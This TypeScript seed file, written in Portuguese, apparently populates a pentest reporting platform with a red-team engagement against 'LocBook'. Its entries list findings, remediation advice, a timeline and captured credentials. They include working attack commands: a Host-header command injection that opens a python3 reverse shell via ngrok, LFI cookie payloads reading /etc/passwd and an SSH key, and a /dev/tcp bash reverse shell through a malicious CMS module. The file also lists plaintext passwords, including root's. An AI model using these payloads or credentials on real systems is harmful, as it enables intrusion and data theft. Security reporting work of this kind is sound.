/**
 * Seed data — LocBook engagement.
 *
 * Reproduz a cadeia de ataque real descrita pelo operador, transformando-a
 * em dados estruturados para demonstrar a plataforma desde o primeiro frame.
 */

import type {
  Project,
  Vulnerability,
  TimelineEvent,
  AttackChainNode,
  Credential,
  Evidence
} from '@/lib/types';

const PID = 'proj_locbook';

export const seedProject: Project = {
  id: PID,
  client: 'LocBook',
  codename: 'LocBook',
  engagementType: 'red_team',
  scope: [
    'locbook.io',
    'stock.locbook.io',
    '3.212.54.4',
    '10.100.85.0/24 (rede interna observada)'
  ],
  methodology: 'graybox',
  startDate: '2026-05-11',
  endDate: '2026-05-12',
  status: 'reporting',
  notes:
    'A cadeia de ataque atingiu privilégios de root em três hosts distintos: Edge (3.212.54.4), pivot intermediário (10.100.85.150) e CMS interno (10.100.85.100). Toda a escalada local foi realizada via CVE-2026-31431 (Copy Fail), explorada pelo artefato copy_fail_ex.py.',
  tools: [
    {
      purpose: 'Port Scanning e coleta de informações',
      tools: ['Nmap', 'Rustscan', 'Whois']
    },
    {
      purpose: 'Quebra de credenciais',
      tools: ['zip2john', 'john the ripper', 'rockyou.txt']
    },
    {
      purpose: 'Exploração Web',
      tools: ['curl', 'Burp Suite', 'XSStrike']
    },
    {
      purpose: 'Escalada de privilégio',
      tools: ['LinPEAS', 'copy_fail_ex.py (CVE-2026-31431)']
    },
    {
      purpose: 'Pivot e tunelamento',
      tools: ['ssh -L', 'chisel', 'ngrok']
    }
  ],
  createdAt: '2026-05-11T08:00:00Z',
  updatedAt: '2026-05-12T19:00:00Z'
};

/* ─────────────── Vulnerabilities ─────────────── */

export const seedVulnerabilities: Vulnerability[] = [
  {
    id: 'vuln_01',
    projectId: PID,
    number: 1,
    title: 'Blind Command Injection em search.php (parâmetro Host)',
    severity: 'critical',
    status: 'unfixed',
    cvss: { vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', score: 9.8 },
    cwe: ['CWE-78'],
    tags: ['RCE', 'Command Injection', 'OWASP-A03', 'Web Application'],
    targets: ['stock.locbook.io', '3.212.54.4'],
    description:
      'O endpoint search.php do vhost stock.locbook.io concatena diretamente o cabeçalho Host na execução de comandos do sistema operacional. Backticks injetados no Host são avaliados sem qualquer sanitização, resultando em execução remota de comandos arbitrários no servidor web.',
    attackScenario:
      'Um atacante não autenticado, alterando o cabeçalho Host de uma requisição HTTP simples, consegue executar comandos arbitrários no servidor Edge (3.212.54.4) sob o contexto do usuário www-data. A partir desse acesso, é possível estabelecer uma reverse shell, enumerar o filesystem, exfiltrar credenciais armazenadas em $HOME/share/pass e iniciar a cadeia de pivot para a rede interna 10.100.85.0/24.',
    recommendation:
      'Refatorar search.php para nunca passar valores de cabeçalho HTTP diretamente para subshells. Utilizar APIs nativas do PHP (array de argumentos via proc_open) ao invés de exec/shell_exec/backticks. Implementar allowlist de caracteres em todas as entradas externas e WAF com regras específicas para injeção de comando.',
    remediationNotes:
      'Migração para uma função interna em PHP que não chame o shell deve eliminar a classe inteira de vulnerabilidade.',
    additionalNotes:
      'O parâmetro vulnerável foi descoberto a partir do arquivo subdomain.conf extraído de ap_backup.zip (FTP anônimo na porta 21).',
    steps: [
      {
        id: 'st_1',
        order: 1,
        text: 'Identificar o vhost interno via cabeçalho Host alternativo.',
        command: 'curl -H "Host: stock.locbook.io" http://3.212.54.4/search.php',
        screenshots: []
      },
      {
        id: 'st_2',
        order: 2,
        text: 'Injetar payload com backticks no Host para confirmar execução cega.',
        command:
          'curl -H "Host: stock.locbook.io\\`id\\`" http://3.212.54.4/search.php -o /tmp/oob',
        screenshots: []
      },
      {
        id: 'st_3',
        order: 3,
        text: 'Disparar reverse shell via python3 + socket apontando para o túnel ngrok.',
        command:
          'curl -H "Host: stock.locbook.io\\`python3 -c \\"import socket,os,pty;s=socket.socket();s.connect((\\\\\\"X.tcp.ngrok.io\\\\\\",PORT));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\\\\\\"/bin/bash\\\\\\")\\"\\`" http://3.212.54.4/search.php',
        screenshots: []
      }
    ],
    pocs: [
      {
        id: 'poc_1',
        title: 'Reverse shell www-data no Edge',
        description:
          'Após o disparo do payload de backticks com python3, a callback chega no listener nc -lvnp configurado via ngrok TCP. O contexto inicial é www-data; a partir daí inicia-se a enumeração local com LinPEAS.',
        code: {
          lang: 'bash',
          content:
            'nc -lvnp 4444\n# ...\nlistening on [any] 4444 ...\nconnect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 51234\nwww-data@ip-10-0-0-51:/var/www/html$ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)'
        },
        screenshots: []
      }
    ],
    isZeroDay: false,
    isEasilyExploitable: true,
    createdAt: '2026-05-11T10:24:00Z',
    updatedAt: '2026-05-11T15:02:00Z'
  },
  {
    id: 'vuln_02',
    projectId: PID,
    number: 2,
    title: 'Escalada de Privilégios via CVE-2026-31431 (Copy Fail)',
    severity: 'critical',
    status: 'unfixed',
    cvss: { vector: 'CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H', score: 7.8 },
    cwe: ['CWE-787'],
    tags: ['Privilege Escalation', 'Kernel', 'CVE-2026-31431', 'Easily-Exploitable'],
    targets: ['3.212.54.4', '10.100.85.150', '10.100.85.100'],
    description:
      'Os três hosts comprometidos executam kernels Linux vulneráveis à CVE-2026-31431 (Copy Fail, ALG_IF_AEAD). O exploit copy_fail_ex.py corrompe 4 bytes na memória cache do módulo criptográfico, escalando qualquer usuário comum a root.',
    attackScenario:
      'Após qualquer acesso inicial como usuário sem privilégios (www-data, flavio, joao, www-data no Backdrop), é possível alcançar root em segundos, comprometendo totalmente o host. Foi exatamente assim que se obteve root nos três sistemas da cadeia.',
    recommendation:
      'Aplicar urgentemente o patch da distribuição para a CVE-2026-31431. Enquanto o patch não for aplicado, desabilitar o módulo cryptouser via /etc/modprobe.d/blacklist e bloquear seu carregamento dinâmico. Monitorar /tmp por artefatos com nome copy_fail_ex.py.',
    remediationNotes: 'Patch disponível desde 14-04-2026 nos kernels 5.15.x, 6.1.x e 6.6.x.',
    additionalNotes: 'O artefato copy_fail_ex.py foi removido manualmente após o engajamento.',
    steps: [
      {
        id: 'st_1',
        order: 1,
        text: 'Transferir o exploit para o host alvo.',
        command:
          'scp copy_fail_ex.py www-data@3.212.54.4:/tmp/copy_fail_ex.py',
        screenshots: []
      },
      {
        id: 'st_2',
        order: 2,
        text: 'Executar o exploit.',
        command: 'cd /tmp && python3 copy_fail_ex.py',
        screenshots: []
      },
      {
        id: 'st_3',
        order: 3,
        text: 'Confirmar acesso root.',
        command: 'id; cat /etc/shadow | head -1',
        screenshots: []
      }
    ],
    pocs: [
      {
        id: 'poc_1',
        title: 'Root no Edge, .150 e .100',
        description:
          'A mesma técnica funcionou nos três hosts. O output abaixo é do Edge mas é representativo de todas as escaladas.',
        code: {
          lang: 'text',
          content:
            'www-data@ip-10-0-0-51:/tmp$ python3 copy_fail_ex.py\n[*] arming ALG_IF_AEAD primitive...\n[*] corrupting 4 bytes @ 0xffffXXXXXX\n[*] spawning /bin/bash as uid=0\nroot@ip-10-0-0-51:/tmp# id\nuid=0(root) gid=0(root) groups=0(root)'
        },
        screenshots: []
      }
    ],
    isZeroDay: false,
    isEasilyExploitable: true,
    createdAt: '2026-05-11T17:11:00Z',
    updatedAt: '2026-05-12T11:30:00Z'
  },
  {
    id: 'vuln_03',
    projectId: PID,
    number: 3,
    title: 'Local File Inclusion via cookie lang em dashboard.php',
    severity: 'critical',
    status: 'unfixed',
    cvss: { vector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N', score: 6.5 },
    cwe: ['CWE-22', 'CWE-98'],
    tags: ['LFI', 'Path Traversal', 'OWASP-A01'],
    targets: ['10.100.85.150'],
    description:
      'A aplicação dashboard.php concatena o valor do cookie lang em um require() do PHP sem normalizar caminhos nem aplicar whitelisting. Sequências de traversal (../) permitem inclusão arbitrária de arquivos.',
    attackScenario:
      'Após autenticar como jose (credencial colhida do Edge), o operador injetou Cookie: lang=../../../../etc/passwd e Cookie: lang=../../../../home/joao/.ssh/id_rsa, conseguindo exfiltrar a chave SSH privada de joao no host 10.100.85.150 — pivot que viabilizou o acesso direto via SSH e a posterior escalada via Copy Fail.',
    recommendation:
      'Substituir o require dinâmico por um switch sobre um conjunto fixo de idiomas suportados. Nunca aceitar paths externos em funções de inclusão. Implementar realpath() + verificação de prefixo. Restringir leitura por usuário via open_basedir.',
    steps: [
      {
        id: 'st_1',
        order: 1,
        text: 'Validar leitura arbitrária com /etc/passwd.',
        command:
          'curl -b "lang=../../../../etc/passwd" http://10.100.85.150/dashboard.php',
        screenshots: []
      },
      {
        id: 'st_2',
        order: 2,
        text: 'Exfiltrar chave SSH privada de joao.',
        command:
          'curl -b "lang=../../../../home/joao/.ssh/id_rsa" http://10.100.85.150/dashboard.php',
        screenshots: []
      }
    ],
    pocs: [],
    isZeroDay: false,
    isEasilyExploitable: true,
    createdAt: '2026-05-12T09:18:00Z',
    updatedAt: '2026-05-12T09:40:00Z'
  },
  {
    id: 'vuln_04',
    projectId: PID,
    number: 4,
    title: 'FTP anônimo expondo backup com credenciais',
    severity: 'high',
    status: 'unfixed',
    cvss: { vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N', score: 7.5 },
    cwe: ['CWE-200', 'CWE-538'],
    tags: ['FTP', 'Information Disclosure', 'OWASP-A05'],
    targets: ['3.212.54.4'],
    description:
      'O serviço vsftpd 3.0.5 exposto na porta 21 do Edge aceita login anônimo e permite download irrestrito de ap_backup.zip, um arquivo protegido por senha trivialmente quebrável (rockyou, 4s).',
    attackScenario:
      'Após download, zip2john + john + rockyou.txt resultam na senha tunafish. O conteúdo (domain.conf, subdomain.conf) revela os vhosts stock.locbook.io e a estrutura interna que viabilizou a exploração de search.php.',
    recommendation:
      'Desabilitar acesso anônimo no vsftpd (anonymous_enable=NO). Remover qualquer artefato sensível dos diretórios servidos. Auditar regularmente o conteúdo público.',
    steps: [
      {
        id: 'st_1',
        order: 1,
        text: 'Autenticar como anonymous e listar conteúdo.',
        command: 'ftp 3.212.54.4\n# Name: anonymous\n# Password: (em branco)\nls\nget ap_backup.zip',
        screenshots: []
      },
      {
        id: 'st_2',
        order: 2,
        text: 'Quebrar a senha do ZIP.',
        command:
          'zip2john ap_backup.zip > hash.txt && john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt',
        screenshots: []
      }
    ],
    pocs: [],
    isZeroDay: false,
    isEasilyExploitable: true,
    createdAt: '2026-05-11T08:42:00Z',
    updatedAt: '2026-05-11T09:05:00Z'
  },
  {
    id: 'vuln_05',
    projectId: PID,
    number: 5,
    title: 'Painel administrativo do Backdrop CMS permite upload de módulo arbitrário',
    severity: 'high',
    status: 'unfixed',
    cvss: { vector: 'CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H', score: 7.2 },
    cwe: ['CWE-434'],
    tags: ['File Upload', 'RCE', 'Backdrop CMS'],
    targets: ['10.100.85.100'],
    description:
      'O painel administrativo do Backdrop CMS no host interno 10.100.85.100 permite instalação e ativação de módulos PHP arbitrários por usuários autenticados como administrador. Foi instalado um módulo customizado contendo passthru/exec, garantindo execução remota.',
    attackScenario:
      'Com o login admin obtido a partir da exfiltração de credenciais no Edge, foi instalado e ativado um módulo PHP malicioso, resultando em shell www-data no host. A partir daí, /var/www/cms/settings.php revelou as credenciais MySQL hardcoded.',
    recommendation:
      'Restringir instalação de módulos no Backdrop a um processo offline com revisão de código. Implementar assinatura de módulos. Segregar permissões: o usuário do painel administrativo não deve ter privilégio de install module.',
    steps: [
      {
        id: 'st_1',
        order: 1,
        text: 'Acessar painel administrativo com credenciais obtidas do Edge.',
        screenshots: []
      },
      {
        id: 'st_2',
        order: 2,
        text: 'Subir módulo customizado contendo passthru($_GET["c"]).',
        screenshots: []
      },
      {
        id: 'st_3',
        order: 3,
        text: 'Acionar reverse shell via curl no endpoint do módulo.',
        command:
          "curl 'http://10.100.85.100/?q=admin/ext/runme&c=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.100.85.150%2F4444%200%3E%261%22'",
        screenshots: []
      }
    ],
    pocs: [],
    isZeroDay: false,
    isEasilyExploitable: false,
    createdAt: '2026-05-12T13:42:00Z',
    updatedAt: '2026-05-12T15:08:00Z'
  },
  {
    id: 'vuln_06',
    projectId: PID,
    number: 6,
    title: 'Credenciais MySQL hardcoded em settings.php',
    severity: 'high',
    status: 'unfixed',
    cvss: { vector: 'CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N', score: 6.8 },
    cwe: ['CWE-798'],
    tags: ['Hardcoded Credentials', 'Information Disclosure'],
    targets: ['10.100.85.100'],
    description:
      'O arquivo /var/www/cms/settings.php contém o usuário e a senha do banco MySQL em texto puro (backdrop_user / 5YirFKMZ90EmNc), permitindo qualquer leitor do arquivo acessar o banco de dados.',
    attackScenario:
      'Após shell www-data via upload de módulo, a leitura de settings.php garante acesso completo ao banco de dados, incluindo a tabela users (admin jose) e quaisquer dados confidenciais armazenados.',
    recommendation:
      'Mover credenciais para variáveis de ambiente ou um secret store (Vault, AWS Secrets Manager). Aplicar chmod 640 em settings.php com o grupo apropriado. Rotacionar credenciais imediatamente.',
    steps: [
      {
        id: 'st_1',
        order: 1,
        text: 'Ler settings.php com a shell www-data.',
        command: 'cat /var/www/cms/settings.php | grep -A2 database',
        screenshots: []
      }
    ],
    pocs: [],
    isZeroDay: false,
    isEasilyExploitable: true,
    createdAt: '2026-05-12T16:11:00Z',
    updatedAt: '2026-05-12T16:25:00Z'
  },
  {
    id: 'vuln_07',
    projectId: PID,
    number: 7,
    title: 'Reutilização de credencial root entre hosts internos',
    severity: 'medium',
    status: 'unfixed',
    cvss: { vector: 'CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H', score: 6.4 },
    cwe: ['CWE-521', 'CWE-307'],
    tags: ['Credential Reuse', 'Lateral Movement'],
    targets: ['10.100.85.150', '10.100.85.100'],
    description:
      'A credencial root capturada em root_creds.txt no host .100 (iiEIRdMVOEP239!3iEKM948) é compartilhada e funcionou em outros hosts da subnet, facilitando movimentação lateral pós-comprometimento.',
    attackScenario:
      'Um atacante que comprometa qualquer host da rede 10.100.85.0/24 obtém efetivamente root em todos os demais hosts que compartilhem a senha, sem necessidade de explorar novas vulnerabilidades.',
    recommendation:
      'Estabelecer credenciais únicas por host. Implementar LAPS (Local Administrator Password Solution) ou equivalente Linux (ex.: Vault + dynamic SSH credentials). Auditoria periódica de senhas reaproveitadas.',
    steps: [],
    pocs: [],
    isZeroDay: false,
    isEasilyExploitable: false,
    createdAt: '2026-05-12T18:01:00Z',
    updatedAt: '2026-05-12T18:30:00Z'
  },
  {
    id: 'vuln_08',
    projectId: PID,
    number: 8,
    title: 'Chave SSH privada de joao desprotegida (sem passphrase)',
    severity: 'medium',
    status: 'unfixed',
    cvss: { vector: 'CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N', score: 6.1 },
    cwe: ['CWE-522'],
    tags: ['SSH', 'Weak Key Protection'],
    targets: ['10.100.85.150'],
    description:
      'A chave privada SSH /home/joao/.ssh/id_rsa não possui passphrase. Combinada com a LFI no dashboard.php, foi suficiente para autenticação direta como joao.',
    attackScenario:
      'Qualquer leitura arbitrária do filesystem expõe a chave para uso imediato sem qualquer fator adicional.',
    recommendation:
      'Reissuar chaves SSH protegidas por passphrase. Adotar hardware tokens (FIDO2) para chaves administrativas. Auditar todos os ~/.ssh/ com chaves sem passphrase.',
    steps: [],
    pocs: [],
    isZeroDay: false,
    isEasilyExploitable: true,
    createdAt: '2026-05-12T09:48:00Z',
    updatedAt: '2026-05-12T10:00:00Z'
  },
  {
    id: 'vuln_09',
    projectId: PID,
    number: 9,
    title: 'Servidor expõe versão de software via banners',
    severity: 'low',
    status: 'unfixed',
    cvss: { vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N', score: 5.3 },
    cwe: ['CWE-200'],
    tags: ['Information Disclosure', 'Fingerprinting'],
    targets: ['3.212.54.4'],
    description:
      'Os serviços vsftpd 3.0.5, OpenSSH 8.9p1 e Apache 2.4.52 expõem versão completa em seus banners, facilitando o mapeamento de CVEs aplicáveis.',
    attackScenario:
      'Diminui o tempo de reconhecimento do atacante e permite enumeração precisa de exploits aplicáveis.',
    recommendation:
      'Mascarar banners (ServerTokens Prod e ServerSignature Off no Apache, ftpd_banner customizado no vsftpd, debug-level desabilitado no sshd).',
    steps: [],
    pocs: [],
    isZeroDay: false,
    isEasilyExploitable: false,
    createdAt: '2026-05-11T08:15:00Z',
    updatedAt: '2026-05-11T08:20:00Z'
  }
];

/* ─────────────── Timeline ─────────────── */

export const seedTimeline: TimelineEvent[] = [
  {
    id: 'evt_01',
    projectId: PID,
    ts: '2026-05-11T08:05:00Z',
    type: 'recon',
    target: '3.212.54.4',
    title: 'nmap inicial no Edge',
    details:
      'Portas abertas: 21 (vsftpd 3.0.5), 22 (OpenSSH 8.9p1), 80 (Apache 2.4.52).'
  },
  {
    id: 'evt_02',
    projectId: PID,
    ts: '2026-05-11T08:42:00Z',
    type: 'enumeration',
    target: '3.212.54.4:21',
    title: 'FTP anonymous → ap_backup.zip',
    details: 'Login anônimo permitido. Download de ap_backup.zip (protegido por senha).',
    vulnerabilityId: 'vuln_04'
  },
  {
    id: 'evt_03',
    projectId: PID,
    ts: '2026-05-11T09:01:00Z',
    type: 'creds',
    title: 'zip2john + john + rockyou → senha tunafish',
    details:
      'Senha do ZIP quebrada em ~4s. Extração revelou domain.conf e subdomain.conf com os vhosts locbook.io e stock.locbook.io.'
  },
  {
    id: 'evt_04',
    projectId: PID,
    ts: '2026-05-11T10:24:00Z',
    type: 'rce',
    host: '3.212.54.4',
    title: 'Blind Command Injection em search.php (Host backticks)',
    details:
      'curl -H "Host: stock.locbook.io" identifica o vhost. Payload com backticks no Host executa comandos.',
    vulnerabilityId: 'vuln_01'
  },
  {
    id: 'evt_05',
    projectId: PID,
    ts: '2026-05-11T11:02:00Z',
    type: 'shell',
    host: '3.212.54.4',
    title: 'Reverse shell www-data via python3 + ngrok',
    details: 'Callback recebida em nc -lvnp 4444 tunelada via ngrok TCP.'
  },
  {
    id: 'evt_06',
    projectId: PID,
    ts: '2026-05-11T13:45:00Z',
    type: 'creds',
    host: '3.212.54.4',
    title: '/home/share/pass decodificado',
    details:
      'Hex → Tu$39!ijdVMeROPazNC384 — senha do usuário flavio. Login SSH bem-sucedido.'
  },
  {
    id: 'evt_07',
    projectId: PID,
    ts: '2026-05-11T17:11:00Z',
    type: 'privesc',
    host: '3.212.54.4',
    title: 'CVE-2026-31431 (Copy Fail) → ROOT no Edge',
    details: '/tmp/copy_fail_ex.py executado por flavio. uid=0 obtido.',
    vulnerabilityId: 'vuln_02'
  },
  {
    id: 'evt_08',
    projectId: PID,
    ts: '2026-05-11T19:30:00Z',
    type: 'exfil',
    host: '3.212.54.4',
    title: 'Coleta de creds e network.txt',
    details:
      'jose/OFD5JFenr32ndi!dn, admin/KCoeMzA1, root_creds.txt. network.txt revela 10.100.85.0/24.'
  },
  {
    id: 'evt_09',
    projectId: PID,
    ts: '2026-05-12T08:55:00Z',
    type: 'pivot',
    host: '10.100.85.150',
    title: 'ssh -L → acesso ao dashboard interno',
    details: 'Túnel via Edge (3.212.54.4) alcança 10.100.85.150:80.'
  },
  {
    id: 'evt_10',
    projectId: PID,
    ts: '2026-05-12T09:18:00Z',
    type: 'rce',
    host: '10.100.85.150',
    title: 'LFI via cookie lang → exfiltração de id_rsa de joao',
    details: 'Cookie: lang=../../../../home/joao/.ssh/id_rsa.',
    vulnerabilityId: 'vuln_03'
  },
  {
    id: 'evt_11',
    projectId: PID,
    ts: '2026-05-12T10:02:00Z',
    type: 'lateral',
    host: '10.100.85.150',
    title: 'ssh -i id_rsa joao@10.100.85.150',
    details: 'Login via chave SSH sem passphrase.'
  },
  {
    id: 'evt_12',
    projectId: PID,
    ts: '2026-05-12T11:30:00Z',
    type: 'privesc',
    host: '10.100.85.150',
    title: 'Copy Fail → ROOT em .150',
    details: 'Mesma técnica aplicada com sucesso.',
    vulnerabilityId: 'vuln_02'
  },
  {
    id: 'evt_13',
    projectId: PID,
    ts: '2026-05-12T13:42:00Z',
    type: 'rce',
    host: '10.100.85.100',
    title: 'Backdrop CMS — módulo PHP malicioso instalado',
    details: 'Painel admin permite upload de módulos. Módulo com passthru → shell.',
    vulnerabilityId: 'vuln_05'
  },
  {
    id: 'evt_14',
    projectId: PID,
    ts: '2026-05-12T16:11:00Z',
    type: 'creds',
    host: '10.100.85.100',
    title: 'MySQL hardcoded em settings.php',
    details: 'backdrop_user / 5YirFKMZ90EmNc. Acesso à tabela users.',
    vulnerabilityId: 'vuln_06'
  },
  {
    id: 'evt_15',
    projectId: PID,
    ts: '2026-05-12T17:48:00Z',
    type: 'privesc',
    host: '10.100.85.100',
    title: 'Copy Fail → ROOT em .100',
    details: 'Terceira escalada bem-sucedida. Cadeia completa.',
    vulnerabilityId: 'vuln_02'
  },
  {
    id: 'evt_16',
    projectId: PID,
    ts: '2026-05-12T18:30:00Z',
    type: 'note',
    title: 'Resumo: 3 hosts root, 1 chave SSH exfiltrada, credenciais persistentes coletadas',
    details: 'Engajamento encerrado. Cadeia documentada para o relatório.'
  }
];

/* ─────────────── Attack chain ─────────────── */

export const seedAttackChain: AttackChainNode[] = [
  {
    id: 'node_internet',
    projectId: PID,
    host: 'INTERNET',
    privilege: 'unauth',
    steps: [{ order: 1, action: 'Reconhecimento — nmap em 3.212.54.4', eventId: 'evt_01' }],
    nextNodeIds: ['node_edge']
  },
  {
    id: 'node_edge',
    projectId: PID,
    host: 'EDGE',
    ip: '3.212.54.4',
    privilege: 'root',
    steps: [
      { order: 2, action: 'FTP anonymous → download de ap_backup.zip', eventId: 'evt_02' },
      { order: 3, action: 'zip2john + john + rockyou → senha tunafish', eventId: 'evt_03' },
      { order: 4, action: 'Extração de domain.conf / subdomain.conf' },
      { order: 5, action: 'curl com Host: stock.locbook.io → search.php', eventId: 'evt_04' },
      { order: 6, action: 'Command Injection cega (backticks) em search.php' },
      { order: 7, action: 'Reverse shell via python3 + ngrok → www-data', eventId: 'evt_05' },
      { order: 8, action: 'pass decodificado → flavio:Tu$39!ijdVMeROPazNC384', eventId: 'evt_06' },
      { order: 9, action: 'ssh flavio@3.212.54.4 bem-sucedido' },
      { order: 10, action: 'CVE-2026-31431 (Copy Fail) → ROOT', eventId: 'evt_07' },
      { order: 11, action: 'Coleta de creds + network.txt → descoberta da rede interna', eventId: 'evt_08' }
    ],
    nextNodeIds: ['node_150']
  },
  {
    id: 'node_150',
    projectId: PID,
    host: 'DASHBOARD',
    ip: '10.100.85.150',
    privilege: 'root',
    steps: [
      { order: 12, action: 'ssh -L tunelando :80 do .150 via Edge', eventId: 'evt_09' },
      { order: 13, action: 'Login dashboard.php com jose / OFD5JFenr32ndi!dn' },
      { order: 14, action: 'LFI via cookie lang → leitura de /etc/passwd', eventId: 'evt_10' },
      { order: 15, action: 'Exfiltração de /home/joao/.ssh/id_rsa' },
      { order: 16, action: 'ssh -i id_rsa joao@10.100.85.150 → shell joao', eventId: 'evt_11' },
      { order: 17, action: 'Copy Fail → ROOT em .150', eventId: 'evt_12' },
      { order: 18, action: 'search_history aponta portas 8009, 8080 em .100 (Tomcat/serviços internos)' }
    ],
    nextNodeIds: ['node_100']
  },
  {
    id: 'node_100',
    projectId: PID,
    host: 'BACKDROP CMS',
    ip: '10.100.85.100',
    privilege: 'root',
    steps: [
      { order: 19, action: 'Acesso ao painel administrativo (Backdrop)' },
      { order: 20, action: 'Instalação/ativação de módulo PHP com passthru', eventId: 'evt_13' },
      { order: 21, action: 'Reverse shell www-data' },
      { order: 22, action: 'MySQL hardcoded em settings.php', eventId: 'evt_14' },
      { order: 23, action: 'Leitura da tabela users (admin jose)' },
      { order: 24, action: 'Copy Fail → ROOT em .100', eventId: 'evt_15' }
    ],
    nextNodeIds: []
  }
];

/* ─────────────── Credentials ─────────────── */

export const seedCredentials: Credential[] = [
  { id: 'cred_01', projectId: PID, user: 'anonymous', context: 'FTP vsftpd 3.0.5', value: '(em branco)', host: '3.212.54.4' },
  { id: 'cred_02', projectId: PID, user: 'ap_backup.zip', context: 'Senha do arquivo (rockyou)', value: 'tunafish', source: 'john the ripper' },
  { id: 'cred_03', projectId: PID, user: 'flavio', context: 'SSH no Edge', value: 'Tu$39!ijdVMeROPazNC384', source: '/home/share/pass (hex)', host: '3.212.54.4' },
  { id: 'cred_04', projectId: PID, user: 'jose', context: 'dashboard.php', value: 'OFD5JFenr32ndi!dn', source: '/root/loot/jose.txt (Edge)', host: '10.100.85.150' },
  { id: 'cred_05', projectId: PID, user: 'admin', context: 'Painel admin (Backdrop)', value: 'KCoeMzA1', source: '/root/loot/admin.txt (Edge)', host: '10.100.85.100' },
  { id: 'cred_06', projectId: PID, user: 'joao', context: 'SSH key (sem passphrase)', value: '~/.ssh/id_rsa', source: 'LFI cookie lang', host: '10.100.85.150' },
  { id: 'cred_07', projectId: PID, user: 'backdrop_user', context: 'MySQL Backdrop CMS', value: '5YirFKMZ90EmNc', source: '/var/www/cms/settings.php', host: '10.100.85.100' },
  { id: 'cred_08', projectId: PID, user: 'root', context: 'Root reutilizado entre hosts', value: 'iiEIRdMVOEP239!3iEKM948', source: 'root_creds.txt (.100)', host: '10.100.85.100' }
];

export const seedEvidence: Evidence[] = [];
